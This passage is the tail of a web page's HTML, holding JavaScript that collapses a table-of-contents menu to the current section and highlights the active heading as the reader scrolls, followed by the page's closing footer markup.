      var beginIndex = index;
      var endIndex = index + 1;
      while (beginIndex >= 0
        && !items[beginIndex].classList.contains('h-h2')) {
        beginIndex -= 1;
      }
      while (endIndex < items.length
        && !items[endIndex].classList.contains('h-h2')) {
        endIndex += 1;
      }
      for (var i = 0; i < beginIndex; i++) {
        item = items[i]
        if (!item.classList.contains('h-h2')) {
          item.style.display = 'none';
        }
      }
      for (var i = beginIndex + 1; i < endIndex; i++) {
        item = items[i]
        // if (!item.classList.contains('h-h2')) {
          item.style.display = '';
        // }
      }
      for (var i = endIndex; i < items.length; i++) {
        item = items[i]
        if (!item.classList.contains('h-h2')) {
          item.style.display = 'none';
        }
      }
    }

    // Init menu collapsed
    doMenuCollapse(-1);

    // Active the menu item
    window.addEventListener('scroll', function (event) {
      var lastActive = menuContent.querySelector('.active');
      var changed = true;
      var activeIndex = -1;
      for (var i = headings.length - 1; i >= 0; i--) {
        var h = headings[i];
        var headingRect = h.getBoundingClientRect();
        var headerRect = header.getBoundingClientRect();
        var headerTop = Math.floor(headerRect.top);
        var headerHeight = Math.floor(headerRect.height);
        var headerHeight = headerTop + headerHeight + 20;
        if (headingRect.top <= headerHeight) {
          var id = 'h-' + h.getAttribute('id');
          var a = menuContent.querySelector('a[href="#' + id  + '"]');
          var curActive = a.parentNode;
          if (curActive) {
            curActive.classList.add('active');
            activeIndex = i;
          }
          if (lastActive == curActive) {
            changed = false;
          }
          break;
        }
      }
      if (changed) {
        if (lastActive) {
          lastActive.classList.remove('active');
        }
        doMenuCollapse(activeIndex);
      }
      event.preventDefault();
    });
  }
  generateContent();
</script>
</section>
</div>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

</footer>
</body>
</html>
